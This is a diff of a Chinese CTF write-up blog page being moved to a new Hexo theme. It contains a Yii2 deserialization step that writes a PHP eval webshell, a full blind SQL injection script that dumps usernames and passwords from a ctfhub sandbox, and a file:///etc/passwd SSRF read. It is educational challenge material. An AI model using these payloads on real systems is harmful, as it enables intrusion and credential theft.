&#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(<br>        serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>看到了禁用函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710205444681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710205444681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>发现assert没有被禁用</p>
 <p>改一下命令</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval(\$_GET[&#x27;cmd&#x27;];?&gt;&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;checkAccess=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-keyword">$this</span>-&gt;id=<span class="hljs-string">&quot;file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php eval(\$_GET[&#x27;cmd&#x27;];?&gt;&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>上传蚁剑连接，插件绕过函数禁用即可。但我在ctfhub上没有复现成功。</p>
 <p>关于yii2一些知识有一张图挺好..</p>
-<p><img src="https://img-blog.csdnimg.cn/20210710220138636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>进入页面F12可以看到<br><img src="https://img-blog.csdnimg.cn/20210712174230205.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210710220138636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h2><p>进入页面F12可以看到<br><img src="https://img-blog.csdnimg.cn/20210712174230205.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>很明显是注入，进入<code>image.php</code>可以看到图片，试了下不同的id发现好像可以盲注，又简单试了下<br><code>if(ascii(substr(database(),1,1))&gt;1,1,0)</code>发现正常显示，ok直接脚本。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge-09493052703a08b5.sandbox.ctfhub.com:10800/image.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_database</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_table</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;ctf&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_column</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;users&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">result</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(username,password)/**/from/**/ctf.users),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-comment"># inject_database(url)</span><br><span class="hljs-comment"># inject_table(url)</span><br><span class="hljs-comment"># inject_column(url)</span><br>result(url)<br><span class="hljs-comment"># database  : ctf</span><br><span class="hljs-comment"># table     : users</span><br><span class="hljs-comment"># column    : USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210712174553772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge-09493052703a08b5.sandbox.ctfhub.com:10800/image.php&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_database</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_table</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/&#x27;ctf&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inject_column</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&#x27;users&#x27;),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">result</span>(<span class="hljs-params">url</span>):</span><br>	name = <span class="hljs-string">&#x27;&#x27;</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>):<br>		low = <span class="hljs-number">32</span><br>		high = <span class="hljs-number">128</span><br>		mid = (low + high) // <span class="hljs-number">2</span><br>		<span class="hljs-keyword">while</span> low &lt; high:<br>			payload = <span class="hljs-string">&quot;if(ascii(substr((select/**/group_concat(username,password)/**/from/**/ctf.users),%d,1))&gt;%d,1,0)&quot;</span>%(i,mid)<br>			params = &#123;<span class="hljs-string">&#x27;id&#x27;</span>:payload&#125;<br>			r = requests.get(url,params = params)<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.text) &gt; <span class="hljs-number">4000</span>:<br>				low = mid + <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				high = mid<br>			mid = (low + high) // <span class="hljs-number">2</span><br><br>		<span class="hljs-keyword">if</span> mid == <span class="hljs-number">32</span>:<br>			<span class="hljs-keyword">break</span><br>		name = name + <span class="hljs-built_in">chr</span>(mid)<br>		<span class="hljs-built_in">print</span> (name)<br><br><span class="hljs-comment"># inject_database(url)</span><br><span class="hljs-comment"># inject_table(url)</span><br><span class="hljs-comment"># inject_column(url)</span><br>result(url)<br><span class="hljs-comment"># database  : ctf</span><br><span class="hljs-comment"># table     : users</span><br><span class="hljs-comment"># column    : USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210712174553772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>登录后是一个主机测试，试了试<code>file:///etc/passwd</code>，返回了文件内容直接<code>file:///flag</code>出。<br>这个题感觉比较基础。也没有什么过滤，payload中就过滤了空格。</p>
 
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/12/2021-7-12-QWB/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">强网杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/">
+                        <span class="hidden-mobile">TSCTF一些总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
     </div>
-</div>
-<style>
-    #noneimg img {
-        display: none;
-        z-index: 109;
-        width: 600px !important;
-        border-radius: 0px;
-        position: fixed;
-        box-shadow: 0 0 0px #c3c3c300 !important;
-        left: 0;
-        top: 0;
-        right: 0;
-        bottom: 0;
-        margin: auto !important;
-    }
-
-    @media screen and (max-width:600px) {
-        #noneimg img {
-            width: 88%
-        }
-    }
-</style>
-<script>
-    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #fffff0;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
-</script>
-<div class="Last-Next">
     
-    <a href="/2021/07/12/2021-7-12-QWB/">
-        <div class="last">
-            <span>上一篇</span>
-            <p>强网杯</p>
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
         </div>
-    </a>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
     
 
     
-    <a href="/2021/07/06/2021-7-6-%E5%85%B3%E4%BA%8Eunicode%E5%AD%97%E7%AC%A6%E4%BD%BF%E7%94%A8/">
-        <div class="next">
-            <span>下一篇</span>
-            <p>TSCTF一些总结</p>
-        </div>
-    </a>
-    
-</div>
-		
-<link rel="stylesheet" href="/css/food.css">
+  </main>
 
-<div class="footer">
-	<div class="Copyright">
-		©2021 By KKfine. 主题：<a
-			style="text-decoration: none;display: contents; color: #898F9F;"
-			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
-	</div>
-	<div class="contact">
-		
-		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
-			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
-		</a>
-		
-	</div>
-</div>
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
 
-<script src="/js/jquery.min.js"></script>
+  
+
+  
+</footer>
 
 
-<script src="/js/gotop.js"></script>
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
-<style type="text/css">
-    @media screen and (min-width: 600px) {
-        .goTop>span {
-            display: block;
-            border-radius: 50%;
-            width: 66px;
-            height: 66px;
-            cursor: pointer;
-            opacity: 0.8;
-            background: rgba(18, 24, 58, 0.06);
-            text-align: center;
-            border: 1px solid rgba(18, 24, 58, 0.06);
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-            transition: border .5s;
-            -moz-transition: border .5s;
-            /* Firefox 4 */
-            -webkit-transition: border .5s;
-            /* Safari 和 Chrome */
-            -o-transition: border .5s;
-            /* Opera */
-        }
-
-        .goTop>span:hover {
-            border: 1px solid #6680B3;
-        }
+<!-- Plugins -->
 
 
-        .goTop {
-            position: fixed;
-            right: 30px;
-            bottom: 80px;
-        }
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
-        .goTop>span>svg {
-            width: 30px;
-            height: 30px;
-            margin-top: 17.5px;
-            opacity: 0.7;
-        }
 
-    }
 
-    @media screen and (max-width: 600px) {
-        .goTop {
-            display: none;
-        }
-    }
-</style>
-<div class="goTop" id="js-go_top">
-    <span>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
-            <g>
-                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
-            </g>
-        </svg>
-    </span>
-</div>
-<script>
-    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
-</script>
-<script>
-	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
-</script>
-	</body>
+  
 
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
 </html>
